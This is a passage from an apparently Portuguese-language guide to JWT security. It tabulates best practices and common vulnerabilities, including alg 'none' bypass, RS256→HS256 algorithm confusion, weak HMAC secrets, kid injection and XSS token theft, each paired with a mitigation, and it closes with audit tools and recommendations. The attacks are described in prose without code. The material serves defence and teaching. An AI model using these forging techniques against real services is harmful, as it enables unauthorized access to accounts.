|                      | Incluir Claims de Validação                   | Sempre inclua e valide as *claims* `iss` (emissor), `aud` (audiência), `exp` (expiração) e `jti` (ID do JWT) para garantir o contexto e evitar *replay*. |
|                      | Não Armazenar Dados Sensíveis                 | O *payload* é visível. Use identificadores opacos (ex: UUID do usuário) e busque dados sensíveis no servidor. Evita vazamento de informações. |
| **Armazenamento no Cliente** | Usar o Padrão de Refresh Token            | Armazene o token de acesso em memória (variável JS) e o *refresh token* em um *cookie* *HttpOnly*, *Secure* e *SameSite*. Mitiga *XSS* e *CSRF*. |
| **Transporte**       | Forçar HTTPS                                  | Transmita tokens apenas sobre conexões HTTPS para prevenir interceptação e ataques *man-in-the-middle*. |
| **Validação no Servidor** | Usar Biblioteca Confiável e Atualizada     | Evite reimplementar a lógica de JWT. Use bibliotecas bem mantidas que são seguras por padrão e mantenha-as atualizadas. |
|                      | Forçar Lista de Algoritmos Permitidos         | Configure explicitamente os algoritmos permitidos (ex: *RS256*) e rejeite todos os outros, especialmente `none`. Previne `alg: 'none'` e confusão de algoritmos. |
|                      | Sempre Usar `verify()`, Nunca `decode()`      | Use a função que verifica a assinatura criptográfica (`verify()`), não a que apenas decodifica o *payload* (`decode()`). Evita *bypass* de assinatura. |
| **Revogação**        | Implementar Estratégia de Revogação           | Implemente uma *denylist* de `jti` para revogação imediata ou invalide *refresh tokens* no servidor. Garante que sessões possam ser encerradas. |

### Tabela 2: Resumo das Vulnerabilidades Comuns de JWT e Mitigações

| Vulnerabilidade                          | Descrição do Ataque                                                                 | Mitigação Primária                                                                 | OWASP Top 10 (2021) | Evidência Chave |
|-----------------------------------------|------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|---------------------|-----------------|
| **Bypass de Assinatura (alg: 'none')**   | O invasor altera o `alg` para `none` e remove a assinatura, enganando o servidor para aceitar um token forjado. | Forçar uma lista de algoritmos permitidos no servidor e rejeitar `none`.           | A02, A05, A07       | 13              |
| **Confusão de Algoritmo (RS256→HS256)** | O invasor altera o `alg` de *RS256* para *HS256* e assina o token com a chave pública do servidor, que é usada indevidamente como segredo *HMAC*. | O servidor deve impor um algoritmo esperado, ignorando o `alg` do token.          | A02, A07            | 13              |
| **Segredo HMAC Fraco**                  | Um segredo *HMAC* previsível é descoberto por *força bruta*, permitindo que o invasor forje tokens válidos. | Usar um segredo *HMAC* com alta entropia (mínimo 256 bits) gerado criptograficamente. | A02                 | 27              |
| **Injeção de kid**                      | Um parâmetro `kid` malicioso leva a *Path Traversal* ou *SQL Injection* no servidor ao tentar buscar a chave de verificação. | Validar e sanitizar rigorosamente o valor de `kid` e usar uma lista de permissões de chaves. | A03 (Injection)     | 9               |
| **Dados Sensíveis no Payload**          | Informações confidenciais (*PII*, etc.) são expostas porque o *payload* é apenas codificado, não criptografado. | Nunca colocar dados sensíveis no *payload*. Usar *JWE* se a confidencialidade for necessária. | A01, A02            | 5               |
| **Roubo de Token via XSS**              | Um script malicioso em uma página vulnerável lê o token do *localStorage* e o envia para o invasor. | Não usar *localStorage*. Armazenar tokens de acesso em memória e *refresh tokens* em *cookies* *HttpOnly*. | A03, A07            | 36              |
| **Falha na Revogação de Token**         | Um token roubado ou de uma sessão encerrada permanece válido até sua expiração, permitindo acesso não autorizado. | Implementar uma *denylist* de `jti` ou um fluxo de *refresh token* com revogação no lado do servidor. | A04, A07            | 73              |

## Auditoria e Teste: Ferramentas e Técnicas para Encontrar Falhas em JWT

A verificação da segurança de uma implementação de JWT requer uma combinação de testes manuais, automação e revisão de código.

- **Teste Manual e Análise**: Ferramentas como o depurador em *jwt.io* são indispensáveis para decodificar tokens e inspecionar seu conteúdo rapidamente. Isso permite que um testador modifique manualmente as *claims* e o cabeçalho para testar a lógica de validação do servidor.
- **Ferramentas Automatizadas**: Ferramentas de teste de segurança de aplicações web, como o *Burp Suite*, são extremamente eficazes. Extensões como *JWT Editor* e *JWT Scanner* automatizam a busca por vulnerabilidades comuns. Elas podem testar ataques de `alg: 'none'`, confusão de algoritmos, *força bruta* de segredos fracos, injeção de parâmetros de cabeçalho e outras falhas conhecidas.
- **Revisão de Código**: A análise estática do código-fonte é crucial para identificar falhas lógicas. Procure pelo uso inseguro de bibliotecas, como chamadas a `jwt.decode()` em vez de `jwt.verify()`, a ausência de validação explícita de algoritmos e *claims*, e a presença de segredos codificados no código.

## Recomendações Finais: Adotando uma Postura de Defesa em Profundidade

Os *JSON Web Tokens* são um padrão poderoso e flexível, mas não uma solução de segurança pronta para uso. Sua implementação segura exige uma compreensão profunda de suas nuances e uma abordagem de defesa em profundidade. A segurança de um sistema baseado em JWT é tão forte quanto seu elo mais fraco.

A abordagem recomendada é abandonar a noção de "stateless" como um objetivo final e, em vez disso, adotar uma arquitetura que gerencia o estado de forma inteligente. O padrão de *refresh token*, que combina tokens de acesso de curta duração armazenados em memória com *refresh tokens* de longa duração em *cookies* *HttpOnly* seguros, oferece o melhor equilíbrio entre segurança, experiência do usuário e escalabilidade. Ele mitiga os riscos de *XSS* e *CSRF*, ao mesmo tempo que fornece um mecanismo de revogação robusto e localiza a necessidade de estado no serviço de autenticação.

Em última análise, a segurança de JWTs depende de uma cadeia de controles bem implementados: criptografia forte na emissão, armazenamento seguro no cliente, transporte seguro via HTTPS, validação rigorosa no servidor e uma estratégia de revogação bem definida. Apenas ao abordar cada um desses estágios com diligência, os desenvolvedores podem aproveitar os benefícios dos JWTs sem sucumbir às suas armadilhas.